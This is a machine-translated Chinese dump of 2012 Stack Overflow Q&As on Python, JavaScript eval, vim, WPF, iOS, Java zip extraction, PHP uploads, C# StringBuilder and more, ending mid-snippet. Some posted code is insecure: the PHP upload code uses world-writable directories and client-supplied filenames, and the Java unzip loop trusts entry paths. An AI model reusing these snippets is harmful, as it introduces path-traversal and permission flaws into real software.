`1.5 3.5 2.5 1.6`-> 我想把它们放在一个由三个变量 + 1 个标量组成的数组中

`4`-> A = 4，我的第一个数组的行数

`3`-> B = 3，我的第二个数组的行数

我想在 5 个变量中加载 A = 4 行的第一个数组（如命令 loadtxt("", unpack = True)

```
1 2 3 4 5
6 7 8 9 10
11 12 13 14 15
16 17 18 19 20 
```

我想在 2 个变量中加载 B = 3 行的第一个数组（如命令 loadtxt("", unpack = True)

```
1 2
3 4
5 6 
```

有什么技术可以在 python 中做这种事情吗？

非常感谢你。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-06-22T12:34:27.203

您正在指定自己的文件格式，这不是很有用。我建议使用现有格式，例如 JSON：

我的文件.txt：

```
{
    "a" : [
        [1, 2, 3, 4, 5],
        [6, 7, 8, 9, 10],
        [11, 12, 13, 14, 15],
        [16, 17, 18, 19, 20]
    ],
    "b" : [
    ...
    ]
} 
```

读取.py

```
import json
myfile = open("myfile.txt")
myVars = json.load(myfile)
myfile.close()
myVars['a'] 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-06-22T12:08:56.960

你可以像这样在python中打开一个文件：

```
f = open("myfile.txt") 
```

现在您可以遍历所有行，并且在每一行中，您可以将其用空格分隔：

```
for line in f.readlines():
    linearray = line.split(' ')
    arraylength = len(linearray)
    print("Array length: "+str(arraylength)) 
```

其余的取决于你。

# javascript - Java Script eval() 函数属于哪个 Object ？调用 eval() 函数时也会传递执行上下文

> ID：11155769
> 
> 赞同：0
> 
> 时间：2012-06-22T12:01:35.583
> 
> 标签：javascript, eval

我关于 JavaScript 中 eval() 函数的问题

1.  eval() 属于哪个对象？
2.  我们知道所有的 java 脚本代码都有一个执行上下文。eval() 得到什么执行上下文？它是全局执行上下文吗？
3.  为什么 eval() 被称为邪恶？是否有任何情况下 eval() 函数可以成为救生员？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-22T12:03:58.750

1.  当您省略一个对象时，您实际上是在窗口对象上调用它。所以它`window.eval`，但由于它的默认值与全局范围相同。
2.  [评估范围很棘手。](http://blog.rakeshpai.me/2008/10/understanding-eval-scope-spoiler-its.html)基本上是全局范围。
3.  eval 很邪恶，你允许用户执行任意代码。这是一件非常可怕的事情。尤其是当它有用户输入时，您不想使用 eval。任何恶意用户都可能真的给你带来麻烦。

# vim - 轻松编辑 formatlistpat？

> ID：11155779
> 
> 赞同：3
> 
> 时间：2012-06-22T12:02:23.127
> 
> 标签：vim

我想为该`formatlistpat`选项尝试不同的正则表达式。关于最简单的方法有什么建议吗？

我知道在插入模式下我可以`<Ctrl+r>`用来粘贴到寄存器中。我可以使用它来编辑宏。选项是否有等价物？或者更简单的东西？

我的另一个想法是寻找一个带有 set 命令的缓冲区。但我不确定将选项值放入缓冲区以便可以编辑的方式。

有什么想法吗？尖端？建议？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-22T14:30:36.087

编辑命令行时，您有两个选项：

1.  使用自动完成：

    ```
    set formatlistpat=<Tab> 
    ```

    （不是真正的选项卡，而是设置为任何 'wildchar'/'wildcharm'）。这将使用正确转义的当前选项值填充命令行。我不能为这个特定选项建议这种方式，因为双重转义看起来很难看，并且在大多数模式中都有很多转义。

2.  使用表达式寄存器（在命令行和插入模式下都有效）：

    ```
    let &formatlistpat=<C-r>=string(&formatlistpat)<CR> 
    ```

    请注意，在这种情况下，转义不会自动完成。使用`:let`and`string()`更容易，然后对`:set`.

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2016-07-19T23:43:40.033

根据[ZyX 的回答](https://stackoverflow.com/a/11158241/712526)，以下内容对`.vimrc`文件有效：

```
let &formatlistpat="^\s*\d\+[\]:.)}\t ]\s*\|^\s*[-*]\s+"
let &formatlistpat=string(&formatlistpat) 
```

# wpf - 如何使用 WPF 和 MVVM 从数据库加载 DataGrid？

> ID：11155786
> 
> 赞同：3
> 
> 时间：2012-06-22T12:02:57.733
> 
> 标签：wpf, c#-4.0, mvvm, wpfdatagrid

我是 WPF 和 MVVM 的新手，所以如果这个查询很简单，我提前道歉。我在网上搜索并没有找到任何符合我要求的东西。Hense为什么我在这里！

我目前正在尝试使用 LINQ 实现从数据库查询的数据表。这是我运行的查询：

```
DataContext connection = new DataContext();

    var getTripInformation = from m in connection.tblTrips
                where m.TripDate > DateTime.Today
                select new { m.TripID, m.TripName, m.TripDate, m.ClosingDate, m.PricePerAdult, m.PricePerChild, m.Status }; 
```

这用我期望的相关信息填充了我的 var。

现在，我想要做的是使用 DataGrid 在我的视图中显示它。任何人都可以帮助我吗？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-06-22T13:22:08.153

简而言之，您将拥有 View 和 ViewModel。ViewModel 需要实现 INotifyPropertyChanged 接口以促进视图绑定。这只是提供了一个在您更改 ViewModel 上的属性时引发的事件。然后，您的 View 将绑定到 ViewModel 的属性。只要视图的 DataContext 设置为 ViewModel 实例，它就可以工作。下面，这是在代码隐藏中完成的，但许多纯粹主义者直接在 XAML 中执行此操作。一旦定义了这些关系，运行您的 LINQ 查询以填充 ObservableCollection（它还实现了 INotifyPropertyChanged 用于在内部添加/删除项目时）并且您的网格将显示数据。

## 视图模型

```
public class MyViewModel : INotifyPropertyChanged
{
    public event PropertyChangedEventHandler PropertyChanged;

    private ObservableCollection<MyRecord> _records = null;
    public ObservableCollection<MyRecord> Records 
    {
        get { return _records; }
        set
        {
            if( _records != value )
            {
                _records = value;

                if( this.PropertyChanged != null )
                {
                    this.PropertyChanged( this, new PropertyChangedEventArgs( "Records" ) );
                }
             }
         }
    }

    public MyViewModel()
    {
        this.Records = new ObservableCollection<MyRecord>();
        this.LoadData();
    }

    private void LoadData()
    {
        // this populates Records using your LINQ query
    } 
```

## 查看（代码隐藏）

```
public class MyView : UserControl
{
    public MyView()
    {
        InitializeControl();

        // setup datacontext - this can be done directly in XAML as well
        this.DataContext = new MyViewModel();
    }
} 
```

## 查看 (XAML)

```
<DataGrid
    ItemsSource="{Binding Path=Records, Mode=OneWay}"
    ...
/> 
```

如果您`AutoGenerateColumns = 'True'`在 DataGrid 上设置，它将为绑定项类型的每个公共属性创建一行。如果将此值设置为 false，则需要显式列出列以及它们将映射到的属性。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-22T12:10:10.033

如果您正在使用 MVVM 开发应用程序，那么您需要做-

1.  ViewModel 类 - 将具有 UI 逻辑并将实现 INotifyPropertyChanged 接口。您需要创建将与 DataGrid 绑定的集合类型的属性。在这个属性的设置器上，您需要调用 PropertyChangedEventHandler。

2.  您需要在 XAML、Codebehind、ViewModel 或某些中介类上将 View 的 DataContext 设置为您的 ViewModel。

# objective-c - 如何知道 NSString 是否适合 UILabel 以及适合的最后一个字符串的索引？

> ID：11155787
> 
> 赞同：5
> 
> 时间：2012-06-22T12:02:59.433
> 
> 标签：objective-c, ios, nsstring, uilabel

我有 4 行 UILabel 具有精确的框架和字体。

我需要知道这个字符串是否适合标签以及适合的最后一个字符的索引是什么。

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-06-22T14:40:45.690

答案的核心在 Cupcake 的参考帖子中。无论如何，您可以使用`sizeWithFont:constrainedToSize:lineBreakMode:`给定宽度的标签中的特定字体来计算框架的大小，给定特定的自动换行，例如

```
CGSize size = [string sizeWithFont:font constrainedToSize:sizeConstraint lineBreakMode:UILineBreakModeWordWrap]; 
```

设置`sizeConstraint`为与标签相同的宽度，但将高度设置为更大。如果结果`size.height`大于你的 UILabel，那么你的字符串太长了。从理论上讲，您可以删除最后一个字符/单词，然后重试并重复直到合适为止。

如果您认为字符串可能很长，您可能想换一种方式，从字符串的一小部分开始并不断添加字符，直到它太大，然后您就知道最后一个字符。

无论哪种方式，这种大小的迭代计算都可能是 CPU 密集型操作，所以要小心。

**更新：**

这是一个算法，它使用默认字体返回`NSString`可以适合`UILabel`问题的长度（但忽略最小字体大小）：

```
- (NSUInteger)fitString:(NSString *)string intoLabel:(UILabel *)label
{
    UIFont *font           = label.font;
    UILineBreakMode mode   = label.lineBreakMode;

    CGFloat labelWidth     = label.frame.size.width;
    CGFloat labelHeight    = label.frame.size.height;
    CGSize  sizeConstraint = CGSizeMake(labelWidth, CGFLOAT_MAX);

    if ([string sizeWithFont:font constrainedToSize:sizeConstraint lineBreakMode:mode].height > labelHeight) 
    {
        NSString *adjustedString;

        for (NSUInteger i = 1; i < [string length]; i++) 
        {
            adjustedString = [string substringToIndex:i];

            if ([adjustedString sizeWithFont:font constrainedToSize:sizeConstraint lineBreakMode:mode].height > labelHeight)
                return i - 1;
        }
    }

    return [string length];
} 
```

例如，如果您检查是否分词模式，跳到下一个单词分隔符然后调用 ，您可能会提高效率`sizeWithFont`，但对于 small `UILabel`s 这可能就足够了。如果您想利用自动换行逻辑来最小化您调用的次数`sizeWithFont`，您可能会遇到如下情况：

```
- (NSUInteger)fitString:(NSString *)string intoLabel:(UILabel *)label
{
    UIFont *font           = label.font;
    UILineBreakMode mode   = label.lineBreakMode;

    CGFloat labelWidth     = label.frame.size.width;
    CGFloat labelHeight    = label.frame.size.height;
    CGSize  sizeConstraint = CGSizeMake(labelWidth, CGFLOAT_MAX);

    if ([string sizeWithFont:font constrainedToSize:sizeConstraint lineBreakMode:mode].height > labelHeight) 
    {
        NSUInteger index = 0;
        NSUInteger prev;
        NSCharacterSet *characterSet = [NSCharacterSet whitespaceAndNewlineCharacterSet];

        do 
        {
            prev = index;
            if (mode == UILineBreakModeCharacterWrap)
                index++;
            else
                index = [string rangeOfCharacterFromSet:characterSet options:0 range:NSMakeRange(index + 1, [string length] - index - 1)].location;
        }
        while (index != NSNotFound && index < [string length] && [[string substringToIndex:index] sizeWithFont:font constrainedToSize:sizeConstraint lineBreakMode:mode].height <= labelHeight);

        return prev;
    }

    return [string length];
} 
```

也许这里使用的字符集不太正确（例如，您是否应该包括连字符），但如果您不需要这样做，它可能非常接近并且比逐个字符更有效。

# java - 无法在 Windows 中使用 ZipEntry 从 zip 文件中提取文件夹

> ID：11155788
> 
> 赞同：0
> 
> 时间：2012-06-22T12:03:05.583
> 
> 标签：java, zip, extract

```
java.util.zip.ZipInputStream zis = new java.util.zip.ZipInputStream(new BufferedInputStream(is));

    java.util.zip.ZipEntry entry;
    new File(outdir+ File.separator+"changelog").delete();
    new File(outdir+ File.separator+"media").delete();
    try {
        while ((entry = zis.getNextEntry()) != null) {

            File of = new File(outdir + File.separator + entry.getName());

            if (entry.isDirectory()) {
                of.mkdirs();
                continue;
            } else {
                File xx = new File(of.getParent());
                if (!xx.exists()) {
                    Stack<String> todo = new Stack<String>();
                    do {
                        todo.push(xx.getAbsolutePath());
                        xx = new File(xx.getParent());
                    } while (!xx.exists());
                    while (todo.size() > 0) {
                        xx = new File(todo.pop());
                        if (!xx.exists()) {
                            xx.mkdirs();
                        }
                    }
                }
            }

            BufferedOutputStream bos = new BufferedOutputStream(new FileOutputStream(of), buffer.length);

            cpio(new BufferedInputStream(zis), bos, "unzip:" + entry.getName());

            bos.flush();
            bos.close();
        }
    } catch (IllegalArgumentException e) {
        // problem with chars in entry name likely
    }catch(Exception e){
        System.out.println(e+"Srikanth");
    }
    zis.close();

} 
```

**entry.isDirectory()**总是返回 false，所以它创建的是文件而不是目录。问题是什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2015-04-17T14:20:47.120

isDirectory 根本不适用于使用 Windows 标准选项“发送到/压缩文件”压缩的文件

zip 的格式不同于使用 7zip 或 Winzip 等工具生成的格式。（很高兴有一个标准的存档压缩：D）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-05T06:50:11.427

**来自**ZipInputStream的****ZipEntry**用 \ 表示文件末尾的空目录，用 / 表示元素的目录**

 **所以**entry.isDirectory()**不适用于空目录。

**ZipFile**中的**ZipEntry**工作正常。**我认为ZipInputStream**和**ZipEntry**行为之间存在差异。**

# php - 由于参数无效，move_uploaded_file() 无法打开流 - PHP

> ID：11155789
> 
> 赞同：-1
> 
> 时间：2012-06-22T12:03:07.030
> 
> 标签：php

我有这段代码可以将我上传的文件移动到特定目录：

```
if (isset($_FILES["image"]["name"])){ 
    if (!is_dir('pf/' . $uid)) {
        mkdir('pf/' . $uid);
        $large_image_location = "pf/" . $uid;
    }else {
        $large_image_location = "pf/" . $uid;
    }

    chmod ($large_image_location, 0777);
    move_uploaded_file("$userfile_tmp", "$large_image_location/$userfile_tmp");    

} 
```

但是，这给出了以下错误：

```
( ! ) Warning: move_uploaded_file(pf/BfyhieniKJGGqTNm/C:\wamp\tmp\phpF08A.tmp) [function.move-uploaded-file]: failed to open stream: Invalid argument in C:\wamp\www\mingle\upload_dp.php on line 26 
```

任何有关如何解决这个问题的帮助将不胜感激！

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-06-22T12:09:35.707

这是你 90% 的问题：

```
 move_uploaded_file("$userfile_tmp", "$large_image_location/$userfile_tmp"); 
```

您在上传路径的开头使用移动到的路径。尝试：

```
move_uploaded_file("$userfile_tmp", "$large_image_location/".$_FILES['image']['name']); 
```

那应该会更好。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-06-22T12:06:45.163

错误本身很清楚，`pf/BfyhieniKJGGqTNm/C:\wamp\tmp\phpF08A.tmp`不是有效的文件名。

不要更改`$_FILES[n]['tmp_name']`（或`$userfile_tmp`就此而言）的内容，因为它始终包含上传文件的完整路径。

# django - 在编辑其他模型字段时显示模型字段

> ID：11155796
> 
> 赞同：0
> 
> 时间：2012-06-22T12:03:48.680
> 
> 标签：django, django-forms

使用表单集（见下文）编辑一批对象中的某些字段，同时显示这些模型对象的其他字段的最直接方法是什么？

例如：

我想显示一组 10 个 Book 对象的标题和每个可以编辑其 ISBN 和描述的表单。

```
class BookForm(ModelForm):
    class Meta:
        model = Book
        fields = ('ISBN', 'description')   # The Book model has many more fields

BookFormSet = modelformset_factory(Book, form=BookForm) 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-24T15:30:36.110

根据[文档](https://docs.djangoproject.com/en/dev/topics/forms/modelforms/)：绑定到模型对象的模型表单实例将包含一个`self.instance`属性，该属性使模型表单方法可以访问该特定模型实例。因此，当您有一个模型集时，例如`BookFormSet`

```
BookFormSet = modelformset_factory(Book, form=BookForm)
formset = BookFormSet(request.POST, queryset=Book.objects.order_by('-pk')[:10]) 
```

您可以在模板中对其进行迭代，例如：

```
<ul>{% for f in formset %}
    <li>{% if f.instance.pk %}title: {{ f.instance.title }}{% endif %} {{ f }}</li>
{% endfor %}</ul> 
```

# java - 如何在java中获取groovy脚本的输出

> ID：11155799
> 
> 赞同：3
> 
> 时间：2012-06-22T12:04:16.003
> 
> 标签：java, groovy

我在java中执行groovy脚本：

```
final GroovyClassLoader classLoader = new GroovyClassLoader();
Class groovy = classLoader.parseClass(new File("script.groovy"));
GroovyObject groovyObj = (GroovyObject) groovy.newInstance();
groovyObj.invokeMethod("main", null); 
```

这个主要方法 println 一些我想保存在某个变量中的信息。我该怎么做 ？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-22T12:10:21.230

您必须将 System.out 重定向到其他内容..

当然，如果这是多线程的，你会遇到问题

```
final GroovyClassLoader classLoader = new GroovyClassLoader();
Class groovy = classLoader.parseClass(new File("script.groovy"));
GroovyObject groovyObj = (GroovyObject) groovy.newInstance();

ByteArrayOutputStream buffer = new ByteArrayOutputStream() ;
PrintStream saveSystemOut = System.out ;
System.setOut( new PrintStream( buffer ) ) ;

groovyObj.invokeMethod("main", null);

System.setOut( saveSystemOut ) ; 
String output = buffer.toString().trim() ; 
```

编写我们的脚本可能会更好（如果可以的话），这样它们会返回一些东西而不是转储到 system.out

# c# - 为什么 StringBuilder.AppendLine 不添加带有某些字符串的新行？

> ID：11155801
> 
> 赞同：40
> 
> 时间：2012-06-22T12:04:28.737
> 
> 标签：c#, .net, newline, stringbuilder

我正在尝试使用 stringbuilder 创建要在文本（不是 HTML）电子邮件中使用的字符串正文。但是有些行（我包括动态数据，没有添加新行，但在某些行中，换行符按预期工作。

使用 stringbuilder 类时我是否缺少一些基本的东西，或者是否应该发生一些更基本的过程？

在下面的代码中：

```
sbUser.AppendLine("Please find below confirmation of your registration details. If any of these details are incorrect, please email someone@somewhere.com");
sbUser.AppendLine();
sbUser.AppendLine("Selected event : " + ContentPage.FetchByID(int.Parse(ddlEvent.SelectedValue)).PageTitle); 
sbUser.AppendLine("Date of event : " + thisEvent.EventStartDate.ToString("dd MMM yyyy"));
sbUser.AppendLine("==============================================================");
sbUser.AppendLine(); 
```

（ContentPage 和 thisEvent 是使用 Subsonic(v2) 构建的自定义类。PageTitle 是字符串的输出类型）

将其作为输出：

```
 Please find below confirmation of your registration details. If any of these details are incorrect, please email someone@somewhere.com

Selected event : My Event Date of event : 16 Sept 2012 ============================================================== 
```

如您所见，代码中第 3 行之后的所有内容都使所有内容都继续到一行。

但是，在我使用的代码下方：

```
sbRR.AppendLine("First name : " + txtFirstname.Text.Trim());
sbRR.AppendLine("Surname : " + txtSurname.Text.Trim());
etc, 
```

并且所有这些都正确地出现在单独的行上。我不明白为什么会这样。

电子邮件是这样组成的

`mailMessage.Body = sbUser.ToString() + sbRR.ToString();`

* * *

添加以下代码：

```
sbUser.AppendLine("Selected event : " + ContentPage.FetchByID(int.Parse(ddlEvent.SelectedValue)).PageTitle + Environment.NewLine); 
sbUser.AppendLine("Date of event : " + thisEvent.EventStartDate.ToString("dd MMM yyyy") + Environment.NewLine); 
```

产生以下输出：

```
Selected event : My Event

Date of event : 16 Sept 2012

============================================================== 
```

我想这是可行的，除了它添加了 2 个换行符（AppendLine 和 Environment.NewLine）。似乎将数据直接从数据库中提取到 stringbuilder 似乎会弄乱行尾。即使我在数据库拉取后添加文本，它仍然保持在一行。

**更新**

做 `StringBuilder.Append("blah"+Environment.NewLine)` 会产生正确的结果，但是我仍然不明白为什么会起作用和`.AppendLine("blah"+<database content>)`不起作用。

* * *

## 回答 #1

> 赞同：42
> 
> 时间：2014-07-21T08:26:51.463

我知道这个问题已经过时并且已被标记为已回答，但我想我会在此处添加此内容，以防其他人遇到此问题，因为它是 Google 首次因`StringBuilder.AppendLine()`无法正常工作而受到打击。

我遇到了同样的问题，结果是 Outlook 问题。Outlook 通过删除额外的换行符来重新格式化基于文本的电子邮件。您可以单击单个电子邮件标题中的“我们删除了此邮件中的额外换行符 -> 恢复换行符”，或更改执行此讨厌小技巧的设置`"Options->Mail->Message Format->Remove extra line breaks in plain text messages"`

解决方法（因为您无法控制每个潜在电子邮件目标的设置）我在这里找到了[Newsletter Formatting And The Remove Extra Line Breaks Issue](http://www.masternewmedia.org/newsletter_publishing/newsletter_formatting/remove_line_breaks_issue_Microsoft_Outlook_2003_when_publishing_text_newsletters_20051217.htm)。基本上，如果您在每行的开头添加两个空格字符，Outlook 将不会重新格式化电子邮件。

这是一个可以提供帮助的扩展方法（方法名称有点冗长，所以根据您的喜好更改:)）

```
namespace System.Text
{
    public static class StringBuilderExtensions
    {
        public static void AppendLineWithTwoWhiteSpacePrefix(this StringBuilder sb, string value)
        {
            sb.AppendFormat("{0}{1}{2}", "  ", value, Environment.NewLine);
        }

        public static void AppendLineWithTwoWhiteSpacePrefix(this StringBuilder sb)
        {
            sb.AppendFormat("{0}{1}", "  ", Environment.NewLine);
        }
    }
} 
```

* * *

## 回答 #2

> 赞同：29
> 
> 时间：2012-06-22T12:07:24.697

代替

```
sbUser.AppendLine(); 
```

尝试使用

```
sbUser.Append(Environment.NewLine); 
```

不知道为什么这有效...

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2012-06-22T12:07:32.160

采用`Environment.NewLine`

```
sbUser.AppendLine("Please find below confirmation of your registration details. If any of these details are incorrect, please email someone@somewhere.com");
sbUser.AppendLine(Environment.NewLine);
sbUser.AppendLine("Selected event : " + ContentPage.FetchByID(int.Parse(ddlEvent.SelectedValue)).PageTitle); 
sbUser.AppendLine("Date of event : " + thisEvent.EventStartDate.ToString("dd MMM yyyy"));
sbUser.AppendLine("==============================================================");
sbUser.AppendLine(Environment.NewLine); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-06-22T12:08:41.480

`Environment.NewLine`在每一行之后或你想要换行的地方使用

例如：-

```
 sbUser.AppendLine("Please find below confirmation of your registration details. If any of these details are incorrect, please email someone@somewhere.com" + Environment.NewLine);
  sbUser.AppendLine("Selected event : " + ContentPage.FetchByID(int.Parse(ddlEvent.SelectedValue)).PageTitle); 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2017-01-15T23:11:31.130

Windows 10 Insider Preview Build 15007。默认行终止符和`Environment.NewLine`都是`"\n"`. 要使用`"\r\n"`，我必须创建一个字符串常量并改用它。

* * *

## 回答 #6

> 赞同：-3
> 
> 时间：2015-06-11T18:54:53.750

第一的 `sbUser.Appendline();`

第二 `sbUser.Append("texto loco ");`

瞧！

=)

# ios - iOS：创建 3D 指南针

> ID：11155810
> 
> 赞同：6
> 
> 时间：2012-06-22T12:05:17.217
> 
> 标签：ios, animation, opengl-es, 3d

我想在 iOS 中制作一个 3D 金属指南针，它有一个可移动的盖子。也就是说，当您用 3 根手指触摸它并尝试向上移动时，盖子会随着您的手指不断移动，并在一定距离后打开。一旦您再次用 3 根手指将其拉下，它就会关闭。我附上了一张关于我在想什么的草图。 ![我的指南针动画](../Images/7825375c3d02772878d5adf37d4f29c6.png)

是否可以使用核心动画和 CALayers？还是我必须使用 OpenGL ES？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-22T16:03:59.473

首先，您显然应该在 3Ds Max 或 Maya 等应用程序中创建带纹理的 3d 模型。然后将其导出为某种合适的格式。最简单的是 OBJ（有很多关于如何加载它的示例）。关于动画有两种选择：

1.  通过旋转封面对象手动制作动画。这可能是最简单的方法。

2.  在您的 3D 编辑器中创建动画，然后在帧之间进行插值。通过这样做，您可以获得更真实的视图。但是在这种情况下，OBJ 格式不适合，但 COLLADA 适合。要加载它，我建议使用 Assimp 库。

如果您不需要一些高级交互，另一种选择是使用伪 3D：只需预渲染所有指南针动画帧并将该动画应用于 2d 纹理。

# cocoa - 在可可的 NSTableView 中创建两行

> ID：11155811
> 
> 赞同：-2
> 
> 时间：2012-06-22T12:05:23.807
> 
> 标签：cocoa, nstableview, nstableviewcell

我有一个带有一列的 NSTableView。正如我们在可可中所知道的，表格是列基。我想借助表格视图在可可中创建一个登录屏幕，其中有两行，一行用于用户名，另一行用于密码。我想知道如何在可可中使用自定义表来创建两行。

请帮帮我。任何帮助表示赞赏。

谢谢

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-22T14:54:41.737

1) 阅读文档并在 Google 中搜索数千个实现[NSTableViewDataSource](https://developer.apple.com/library/mac/#documentation/Cocoa/Reference/ApplicationKit/Protocols/NSTableDataSource_Protocol/Reference/Reference.html)协议的示例中的任何一个。如果遇到问题，请回复具体问题。

2) 重新考虑为什么选择 NSTableView 而不是标准文本字段和标签或 NSForm 甚至 NSMatrix。以这种方式使用 NSTableView 不仅很奇怪，而且它的实现也会很笨拙和奇怪。

让我稍微支持一下最后一点。对话框 - 模式或非模式 - 通常只有几个字段。这就是字段和标签的用途。如果您发现自己要处理许多相同类型的输入字段，则 NSForm 更适合您，但在您的情况下有一些陷阱。一个 NSTableView 显示表格，而由两个或三个单独标记的字段组成的单列并不是真正的表格。只需使用文本字段和密码字段，在它们上面贴上标签，然后就可以完成了。:-)

# html - 对不规则 div 应用阴影

> ID：11155816
> 
> 赞同：0
> 
> 时间：2012-06-22T12:05:30.217
> 
> 标签：html, shadow

我正在疯狂地寻找一种将阴影应用于不规则形状的方法。通过常规方式应用阴影获得的结果是一个框，所需的结果是形状周围的阴影。

可以说我有这个带有 div 的形状：

```
 *************************************************
   +----------------+                              *
   |                |                              *
   +----------------------------------------------+*
   |                                              |*
   |                                              |*
   |                                              |*
   |                                              |*
   +----------------------------------------------+* 
```

上图是我得到的。(*) 开始是阴影。

```
 *******************
   +----------------+*                             
   |                |*******************************
   +----------------------------------------------+*
   |                                              |*
   |                                              |*
   |                                              |*
   |                                              |*
   +----------------------------------------------+* 
```

这就是我想要的......

代码：

```
<div class="shadow_area">
    <div class="menu_up_message">
        <div class="image_holder">
            <div class="image_icon" style="margin-left:10px"></div>
            <div class="image_text" >image</div>
        </div>
        <div class="video_holder">
            <div class="video_icon"></div>
            <div class="image_text">video</div>
        </div>
        <div class="link_holder">
            <div class="link_icon"></div>
            <div class="image_text">link</div>
        </div>
    </div>
    <div class="message_input_holder">
        <textarea name="msg" class="message_textarea"></textarea>
    </div>
</div> 
```

的CSS：

```
.shadow_area {
-webkit-box-shadow: 0px 0px 10px rgba(50, 50, 50, 1);
-moz-box-shadow:    0px 0px 10px rgba(50, 50, 50, 1);
box-shadow:         0px 0px 10px rgba(50, 50, 50, 1); 
```

}

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-22T12:26:25.860

Could you use something like this?: (Make one div for the top, and one for the main container?)

```
<div class="first">&nbsp;</div>
<div class="myDiv">&nbsp;</div>

.first
{
    margin-top: 10px;
    margin-left: 10px;
    border: 1px solid #333;
    width: 100px;
    height: 50px;
    -webkit-box-shadow: 6px -5px 4px -2px #888 ;
    background:#fff;
    border-bottom:0px;
}
.myDiv
{
    margin-top:-1px;
    margin-left: 10px;
    border: 1px solid #333;
    width: 400px;
    height: 100px;
    -webkit-box-shadow: 10px -4px 5px -2px #888 ;
}​​ 
```

# php - 通过 Macports 安装 PHP5 总是出错

> ID：11155817
> 
> 赞同：2
> 
> 时间：2012-06-22T12:05:30.327
> 
> 标签：php, macos, macports

我想使用 macports 在我的 mac 上安装 php5。它在终端上引发以下错误：

> 试图从[http://packages.macports.org/php5](http://packages.macports.org/php5)
> 获取 php5-5.3.12_0+apache2.darwin_11.x86_64.tbz2.rmd160 错误： org.macports.archivefetch 端口 php5 返回： 无法验证存档的签名！
> 有关详细信息，请参阅端口 php5 的日志文件：
> 
> /opt/local/var/macports/logs/_opt_local_var_macports_sources_rsync.macports.org_release_tarballs_ports_lang_php5/php5/main.log
> 要报告错误，请按照指南中的说明进行操作：
> [http](http://guide.macports.org/#project.tickets)
> ://guide.macports.org/#project.tickets 错误：处理端口 php5 失败

我应该怎么办？

# javascript - 如果不是 Internet Explorer，则仅运行脚本

> ID：11155818
> 
> 赞同：5
> 
> 时间：2012-06-22T12:05:38.360
> 
> 标签：javascript, html, internet-explorer

我将如何在除 Internet Explorer 之外的每个浏览器中运行脚本？

我在我的网站上使用 queryloader2，并且（无论出于何种原因）在 IE9 中加载大约需要一分钟，我假设在旧版本的 IE 中相同或更糟。在任何其他浏览器中，只需几秒钟。因此，我不想让脚本在任何版本的 IE 中运行（它不会真正损害网站的功能）。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-06-22T12:06:49.173

您需要为此使用条件注释：

```
<!--[if !IE]>
    <script src="myScript.js" type="text/javascript"></script>
<![endif]--> 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2017-12-07T20:36:08.600

所有其他答案中的条件注释（在本文发布时）都不正确，将被解释为（无效的）HTML 或在非 IE 浏览器中被完全忽略为 HTML 注释。

重要的是要了解，就 IE 以外的任何浏览器（甚至更新版本的 IE）而言，“条件 HTML 注释”只是一个注释。换句话说，类似于被赞成的答案的建议：

```
<!--[if !IE]>
    <script src="myScript.js" type="text/javascript"></script>
<![endif]--> 
```

就 IE 以外的任何内容而言，只是一个长注释，从第`<!--`1 行开始到第 3 行结束`-->`，就像任何其他 HTML 注释一样。

要让 IE 忽略一大段 HTML，您必须利用 HTML 注释不支持嵌套这一事实，即`<!-- <!-- --> something -->`注释以第*一个* `-->`而不是第二个结尾，意思`something -->`将被解析为 HTML 而不是被认为是评论的一部分。

所以我们可以做的是使用这样的东西：

```
<!--[if !IE]-->
    <script type="text/javascript" src="script.js"></script>
<!--<![endif]--> 
```

在这里，非 IE 浏览器会在中间看到两条单独的注释（分别在第 1 行和第 3 行）和常规 HTML。但是解析这些标签的浏览器会看到从第一行开始的注释，*然后忽略所有内容，直到遇到* `<![endif]-->`第三行。这为我们提供了一段代码，将由非 IE/现代浏览器执行，但会被支持条件 HTML 的旧版本 IE 忽略。

* * *

## 回答 #3

> 赞同：-2
> 
> 时间：2014-08-07T04:49:34.390

下面的代码可能很好，但不幸的是不能解决我的问题，，，，，，，，，，，，，，，所以如果上面的代码不起作用，那么使用这个

```
<![if !IE]>You are NOT using IE.<![endif] 
```

# java - 为什么我的 HTC 魔术出现 OutOfMemoryError 异常？

> ID：11155824
> 
> 赞同：0
> 
> 时间：2012-06-22T12:06:01.683
> 
> 标签：java, android, jsoup, out-of-memory

如果我在我的 HTC 魔术手机上运行以下代码，我会收到`java.lang.OutOfMemoryError`错误消息。对于我的手机来说，这个简单的短代码要求太多了吗？

我认为代码很简单而且很有效，但我的手机根本吃不下它。如果我将代码切成一半（就在第一个`for`循环之后），手机就会吃掉它。

我检查了我的手机内存，在“打开高级任务杀手”应用程序的帮助下，它显示 79 MB 可用。

我没有同时打开很多应用程序，而且我尝试执行的代码并不多（在我看来）。

我真的必须买一部新手机还是有其他方法可以解决这个问题？

```
public class SomeActivity extends Activity 
{
public TextView tv; 
public ImageView imgv;

/** Called when the activity is first created. */
@Override
public void onCreate(Bundle savedInstanceState) 
{
    super.onCreate(savedInstanceState);
    setContentView(R.layout.main);

    tv = (TextView)findViewById(R.id.textview);
    imgv = (ImageView)findViewById(R.id.imageView1);

    tv.setText("This is the new text");

    try 
    {
        String selectedGenre = "http://www.somewebpage.com/";

        Document doc = Jsoup.connect(selectedGenre).timeout(0).get(); 
        Elements liElements = doc.select("ul#navbar li"); 

        String pagesAmount = null;

        int liElementsCounter = 0;

        for (Element element : liElements) 
        {
